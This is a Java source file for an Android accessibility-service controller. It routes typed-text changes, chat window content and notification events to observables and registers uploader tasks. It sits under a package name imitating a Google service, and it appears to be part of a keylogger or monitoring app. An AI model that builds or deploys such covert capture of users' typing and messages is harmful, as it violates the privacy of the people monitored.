package service.android.google.com.accessibility.controller;

import android.content.res.Resources;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.github.pwittchen.prefser.library.Prefser;

import rx.subjects.PublishSubject;
import rx.subscriptions.CompositeSubscription;
import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.model.ASEvent;
import service.android.google.com.accessibility.rx.ObservableFactory;
import service.android.google.com.accessibility.upload.UploaderHelper;
import service.android.google.com.accessibility.util.test.TestOnly;
import timber.log.Timber;

public class AccessibilityServiceControllerImpl implements AccessibilityServiceController {

    private final PublishSubject<AccessibilityEvent> textEventObservable;
    private final PublishSubject<AccessibilityEvent> eventObservable;
    private final PublishSubject<AccessibilityNodeInfo> chatEventObservable;
    private final CompositeSubscription compositeSubscription;
    private final UploaderHelper uploaderHelper;

    private boolean isChatEventObservableEnabled;
    private boolean isGeneralEventObservableEnabled;
    private boolean isTextEventObservableEnabled;

    public AccessibilityServiceControllerImpl(final ObservableFactory observableFactory,
                                              final Prefser prefser,
                                              final Resources resources,
                                              final UploaderHelper uploaderHelper) {
        compositeSubscription = new CompositeSubscription();
        this.isGeneralEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_event_general), Boolean.class, resources.getBoolean(R.bool.general_event));
        this.isChatEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_chat_event), Boolean.class, resources.getBoolean(R.bool.chat_message_event));
        this.isTextEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_event_text), Boolean.class, resources.getBoolean(R.bool.text_event));

        this.eventObservable = observableFactory.createPublishSubjectOfAccessibilityEvents();
        this.textEventObservable = observableFactory.createPublishSubjectOfAccessibilityTextEvents();
        this.chatEventObservable = observableFactory.createPublishSubjectOfAccessibilityNodeInfo();

        this.uploaderHelper = uploaderHelper;
        subscribeObservePreferences(observableFactory);
    }

    @TestOnly
    AccessibilityServiceControllerImpl(final PublishSubject<AccessibilityEvent> textEventObservable,
                                       final PublishSubject<AccessibilityEvent> eventObservable,
                                       final PublishSubject<AccessibilityNodeInfo> nodeInfoPublishSubject,
                                       final Prefser prefser,
                                       final Resources resources,
                                       final CompositeSubscription compositeSubscription,
                                       final UploaderHelper uploaderHelper) {
        this.isGeneralEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_event_general), Boolean.class, resources.getBoolean(R.bool.general_event));
        this.isChatEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_chat_event), Boolean.class, resources.getBoolean(R.bool.chat_message_event));
        this.isTextEventObservableEnabled = prefser.get(resources.getString(R.string.pref_key_event_text), Boolean.class, resources.getBoolean(R.bool.text_event));

        this.textEventObservable = textEventObservable;
        this.eventObservable = eventObservable;
        this.chatEventObservable = nodeInfoPublishSubject;

        this.compositeSubscription = compositeSubscription;

        this.uploaderHelper = uploaderHelper;
    }

    private void subscribeObservePreferences(final ObservableFactory observableFactory) {
        compositeSubscription.add(observableFactory.subscribeObservePreferences());
    }

    @Override
    public void toggleEventTracking(final boolean isEnabled) {
        Timber.w("General Event Tracking: ", String.valueOf(isEnabled ? "true" : "false"));
        this.isGeneralEventObservableEnabled = isEnabled;
    }

    @Override
    public void toggleTextEventTracking(final boolean isEnabled) {
        Timber.w("Text Event Tracking: ", String.valueOf(isEnabled ? "true" : "false"));
        this.isTextEventObservableEnabled = isEnabled;
    }

    @Override
    public void toggleChatEventTracking(final boolean isEnabled) {
        Timber.w("Chat Event Tracking: ", String.valueOf(isEnabled ? "true" : "false"));
        this.isChatEventObservableEnabled = isEnabled;
    }

    @Override
    public void unSubscribe() {
        if (compositeSubscription != null) {
            compositeSubscription.unsubscribe();
        }
    }

    @Override
    public void evaluateEvent(final AccessibilityNodeInfo rootInActiveWindow,
                              final AccessibilityEvent accessibilityEvent) {
        final int type = accessibilityEvent.getEventType();
        switch (type) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                if (isChatEventObservableEnabled) {
                    chatEventObservable.onNext(rootInActiveWindow);
                }

                if (isGeneralEventObservableEnabled) {
                    eventObservable.onNext(accessibilityEvent);
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                if (isTextEventObservableEnabled) {
                    textEventObservable.onNext(accessibilityEvent);
                }
                break;
            default:
                break;
        }
    }

    @Override
    public void evaluateEvent(final ASEvent event) {
        Timber.d(event.toString());
    }

    @Override
    public void handleError(final Throwable e) {
        Timber.e(e, "Handled Exception.");
    }

    @Override
    public void registerUploaderTask() {
        uploaderHelper.registerTasks();
    }
}